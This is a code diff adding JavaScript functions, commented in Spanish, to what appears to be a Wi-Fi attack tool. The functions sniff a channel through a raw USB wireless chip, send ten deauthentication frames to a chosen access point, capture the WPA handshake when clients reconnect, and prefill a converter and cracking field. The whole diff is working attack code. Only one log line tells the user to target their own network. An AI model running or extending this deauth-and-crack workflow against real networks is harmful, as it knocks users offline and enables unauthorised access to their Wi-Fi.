@@ -2134,3 +2134,76 @@ window.usbRawAttackCycle = async function () {
     setAttackRunning(false);
   }
 };
+
+// ── Sniff + Handshake con UNA sola antena (RX por USB crudo) ─────────────
+// El chip WinUSB ahora TAMBIÉN escucha (EP 0x81, port del path RX rt2x00usb).
+// Igual que en Kali: deauth y captura con el MISMO chip, sin rebinds.
+window.usbRawSniff = async function (secs) {
+  const s = secs || parseInt(($('usbraw-sniff-secs') || {}).value, 10) || 30;
+  const chan = parseInt(($('usbraw-chan') || {}).value, 10) || 11;
+  log('[sniff] Escuchando ' + s + 's en canal ' + chan + ' (RX por USB crudo)…', 'info');
+  const line = $('usbraw-status');
+  if (line) { line.textContent = 'Chip USB: 🎧 escuchando ' + s + 's…'; }
+  try {
+    const r = await window.usbRawShow(await window.__invoke('usb_raw_sniff', { durationSecs: s, channel: chan }));
+    log('[sniff] ' + r.message, r.success ? 'ok' : 'warn');
+    return r;
+  } catch (e) {
+    log('[sniff] ' + e, 'error');
+    return null;
+  }
+};
+
+// Flujo completo con UNA antena: deauth + captura del handshake del mismo chip.
+window.usbRawHandshake = async function () {
+  const bssidInput = $('usbraw-bssid');
+  let bssid = bssidInput && bssidInput.value.trim();
+  if (!bssid) bssid = getSelectedBssid();
+  if (!bssid) { log('[handshake] Selecciona objetivo del escaneo (SOLO tu red).', 'warn'); return false; }
+  const chan = parseInt(($('usbraw-chan') || {}).value, 10) || (selectedChannel() || 11);
+  const bx = $('usbraw-bssid'); if (bx && !bx.value) bx.value = bssid;
+  const line = $('usbraw-status');
+  const setSt = (t, ok) => { if (line) { line.textContent = 'Chip USB: ' + t; line.className = 'wiz-status' + (ok ? ' ok' : ' warn'); } };
+  setAttackRunning(true, 'Handshake USB (una antena)…');
+  try {
+    setSt('verificando chip…', false);
+    const st = await window.__invoke('usb_raw_status');
+    if (!st.success) { log('[handshake] ' + st.message, 'error'); setSt('❌ ' + st.message, false); return false; }
+
+    setSt('init firmware…', false);
+    const ini = await window.__invoke('usb_raw_init', { channel: chan });
+    if (!ini.success) { log('[handshake] init: ' + ini.message, 'error'); return false; }
+
+    // Lanzar sniff EN PARALELO (hilo del binario), luego deauth, luego esperar
+    setSt('lanzando RX en paralelo…', false);
+    const sniffPromise = window.__invoke('usb_raw_sniff', { durationSecs: 25, channel: chan });
+    await new Promise(r => setTimeout(r, 1500)); // RX listo
+
+    setSt('deauth x10…', false);
+    const de = await window.__invoke('usb_raw_deauth', { bssid, channel: chan, count: 10 });
+    log('[handshake] deauth: ' + de.message, de.success ? 'ok' : 'warn');
+
+    setSt('esperando EAPOL (25s)…', true);
+    log('[handshake] Esperando reconexión del cliente — EAPOL llegará por el mismo chip…', 'info');
+    const sn = await sniffPromise;
+    window.usbRawShow(sn);
+    if (sn && sn.success) {
+      setSt('✅ captura completada — convierte con pcap_to_22000', true);
+      log('[handshake] Captura lista. Siguiente: convertir (pcap_to_22000) y crackear.', 'ok');
+      // prefill del convertidor nativo si la ruta es accesible
+      const m = (sn.message || '').match(/(pcap: )(.+\.pcap)/);
+      if (m) {
+        const conv = $('convert-native-pcap'); if (conv) conv.value = m[2];
+        const cx = $('crack-hash'); if (cx) cx.value = m[2] + '.22000';
+      }
+      return true;
+    }
+    setSt('⚠️ sin EAPOL capturado', false);
+    return false;
+  } catch (e) {
+    log('[handshake] error: ' + e, 'error');
+    return false;
+  } finally {
+    setAttackRunning(false);
+  }
+};
